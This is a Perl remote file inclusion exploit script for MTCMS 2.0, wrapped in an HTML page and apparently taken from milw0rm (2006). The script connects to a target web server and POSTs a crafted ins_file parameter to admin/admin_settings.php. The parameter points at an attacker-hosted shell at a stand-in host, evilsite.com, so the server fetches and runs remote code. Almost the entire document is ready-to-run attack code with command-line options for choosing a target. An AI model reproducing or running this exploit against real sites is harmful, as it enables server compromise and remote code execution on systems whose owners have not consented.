<html><head><title>MTCMS <= 2.0 (admin/admin_settings.php) Remote File Include Exploit</title></head><pre>#!/usr/bin/perl
# +-------------------------------------------------------------------------------------------
# + MTCMS &lt;= 2.0 (admin/admin_settings.php) Remote File Include Exploit
# +-------------------------------------------------------------------------------------------
# + Affected Software .: MTCMS &lt;= 2.0
# + Vendor ............: http://www.mtcms.co.uk/
# + Download ..........: http://mtcms.co.uk/downloads/index.php?file=MTCMS-V2.rar
# + Description .......: &quot;MTCMS is a PHP/MySQL, Content Management System (CMS).&quot;
# + Class .............: Remote File Inclusion
# + Risk ..............: High (Remote File Execution)
# + Found By ..........: nuffsaid &lt;nuffsaid[at]newbslove.us&gt;
# + Requirements.......: register_globals = on
# +-------------------------------------------------------------------------------------------

use Getopt::Long;
use URI::Escape;
use IO::Socket;

$remotefile = &quot;http://evilsite.com/shell.php&quot;;

main();

sub usage
{
    print &quot;\nMTCMS &lt;= 2.0 Remote File Include Exploit\n&quot;;
    print &quot;nuffsaid &lt;nuffsaid[at]newbslove.us&gt;\n&quot;;
    print &quot;-h, --host\ttarget host\t(example.com)\n&quot;;
    print &quot;-f, --file\tremote file\t(http://evilsite.com/shell.php)\n&quot;;
    print &quot;-d, --dir\tinstall dir\t(/mtcms)\n&quot;;
    exit;
}

sub main
{
    GetOptions ('h|host=s' =&gt; \$host,'f|file=s' =&gt; \$file,'d|dir=s' =&gt; \$dir);
    usage() unless $host;
    $remotefile = $file unless !$file;
    $url = uri_escape($remotefile);
    
    $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$host&quot;,PeerPort=&gt;&quot;80&quot;)
     or die &quot;\nconnect() failed.\n&quot;;
     
    print &quot;\nconnected to &quot;.$host.&quot;, sending data.\n&quot;;
    $sendurl = &quot;inst=true&amp;ins_file=&quot;.$url.&quot;&quot;;
    $sendlen = length($sendurl);
    print $sock &quot;POST &quot;.$dir.&quot;/admin/admin_settings.php?b=addons&amp;c=easy_add HTTP/1.1\n&quot;;
    print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
    print $sock &quot;Connection: close\n&quot;;
    print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
    print $sock &quot;Content-Length: &quot;.$sendlen.&quot;\n\n&quot;;
    print $sock $sendurl;
    print &quot;attempted to include remote file, server response:\n\n&quot;;
    while($recvd = &lt;$sock&gt;)
    {
        print &quot; &quot;.$recvd.&quot;&quot;;
    }
    exit;
}

# milw0rm.com [2006-12-25]</pre></html>